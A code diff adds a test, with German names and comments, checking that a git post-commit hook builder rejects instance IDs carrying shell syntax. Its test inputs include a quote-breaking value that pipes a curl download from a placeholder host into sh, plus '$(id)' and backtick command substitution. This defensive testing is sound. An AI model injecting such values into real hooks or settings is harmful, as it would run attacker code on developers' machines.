@@ -13,6 +13,7 @@ import {
   buildClsPostCommitHook,
   CLS_HOOK_VERSION,
   CLS_NODE_PROGRAM,
+  INSTANZ_ID_MUSTER,
 } from './config';
 
 describe('normalizeBaseUrl', () => {
@@ -197,6 +198,16 @@ describe('buildClsPostCommitHook', () => {
     expect(quelle).toContain(`export const CLS_HOOK_VERSION = '${CLS_HOOK_VERSION}'`);
     expect(CLS_NODE_PROGRAM).toContain('npx-cli.js');
     expect(CLS_NODE_PROGRAM).not.toContain("execFileSync('npx',['@cachly");
+  });
+
+  it('lehnt eine Instanz-ID mit Shell-Zeichen ab (05.11.2026: kam ungeprueft aus .vscode/settings.json)', () => {
+    for (const boese of ['x"; curl https://example.invalid/x | sh; echo "', 'a$(id)', 'a`id`', 'a b', 'a\nb', '', 'x'.repeat(65)]) {
+      expect(() => buildClsPostCommitHook(boese), JSON.stringify(boese)).toThrow(/do not belong in a git hook/);
+    }
+    // Dieselbe Regel wie instanzIdFuerSkript in sdk/mcp/src/git-ohne-shell.ts.
+    const mcp = readFileSync(resolve(__dirname, '..', '..', '..', 'mcp', 'src', 'git-ohne-shell.ts'), 'utf8');
+    expect(mcp).toContain(`const INSTANZ_ID_MUSTER = ${INSTANZ_ID_MUSTER.toString()};`);
+    expect(buildClsPostCommitHook('8e03addd-a2d9-406e-bcbb-d6d8c938a3d0')).toContain('"8e03addd-a2d9-406e-bcbb-d6d8c938a3d0"');
   });
 
   it('embeds instance id, version marker, and shebang', () => {
